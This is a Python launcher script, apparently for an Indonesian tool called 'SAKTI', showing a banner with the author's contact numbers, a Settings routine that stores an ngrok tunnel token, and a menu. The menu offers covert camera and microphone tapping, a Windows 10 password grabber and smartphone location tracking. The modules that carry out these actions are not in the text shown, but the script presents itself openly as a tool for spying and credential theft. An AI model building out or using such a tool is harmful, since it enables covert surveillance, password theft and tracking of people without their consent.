import os
from colorama import Fore
import time
import sys
import json
from subprocess import Popen
def banner():
    os.system("clear")
    print(Fore.LIGHTBLUE_EX+"""\n 
    
░██████╗░█████╗░██╗░░██╗████████╗██╗
██╔════╝██╔══██╗██║░██╔╝╚══██╔══╝██║
╚█████╗░███████║█████═╝░░░░██║░░░██║
░╚═══██╗██╔══██║██╔═██╗░░░░██║░░░██║
██████╔╝██║░░██║██║░╚██╗░░░██║░░░██║
╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░╚═╝


█▀▄▀█ █▀█ ░ █░█ ▄█ █░█ █▄░█
█░▀░█ █▀▄ ▄ ▀▀█ ░█ ▀▀█ █░▀█
""")    
    print("")    
    print("====================================")
    print("author = MR.414N 😇😇")
    print("github = https://github.com/MR414N-ID 😙😙")
    print("WA1    = +15512131770 😜😜")
    print("WA2    = 082292838634 🤣🤣")
    print("TEAM   = IMC ❤️❤️")
    print("====================================")

 
    time.sleep(2)


def infolist0():
    time.sleep(0.1)
    print(Fore.RED+" ["+Fore.WHITE+"*"+Fore.RED+"]"+Fore.CYAN+" pilih salah satu yah abang 😇😇 \n")
    time.sleep(0.1)
    print(Fore.RED+" [1]"+Fore.WHITE+" Sadap kamera\n")
    time.sleep(0.1)
    print(Fore.RED+" [2]"+Fore.WHITE+" Sadap Microphone\n") 
    time.sleep(0.1)
    print(Fore.RED+" [3]"+Fore.WHITE+" OS Password Grabber "+Fore.GREEN+"[WIN-10]\n") 
    time.sleep(0.1)
    print(Fore.RED+" [4]"+Fore.WHITE+" Lacak Lokasi "+Fore.GREEN+"[SMARTPHONES]\n")
    time.sleep(0.1)
    print(Fore.RED+" [5]"+Fore.WHITE+" Settings \n")
    time.sleep(0.1)
    print(Fore.RED+" [6]"+Fore.WHITE+" Keluar . . .\n")

  
def Settings():
    print(Fore.WHITE+" [+]"+Fore.GREEN+" Please Enter NGROK Token  > ngrok.com\n")
    
    try:

        ngrok_key = input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+"MR.414N"+Fore.BLUE+"~"+Fore.WHITE+"@HOME"+Fore.GREEN+"/SETTINGS"+Fore.RED+"""]
 └──╼ """+Fore.WHITE+"$ ")  
        with open("config.json") as json_file:
            json_key = json.load(json_file)
            json_key['ngrok'] = ngrok_key

        with open("config.json","w") as json_file:
            json_key = json.dump(json_key,json_file)
        input(Fore.LIGHTRED_EX+" [*]  Back To Menu (Press Enter...) ")
    except:
        print("")
        print("\n")
        sys.exit()
    
          
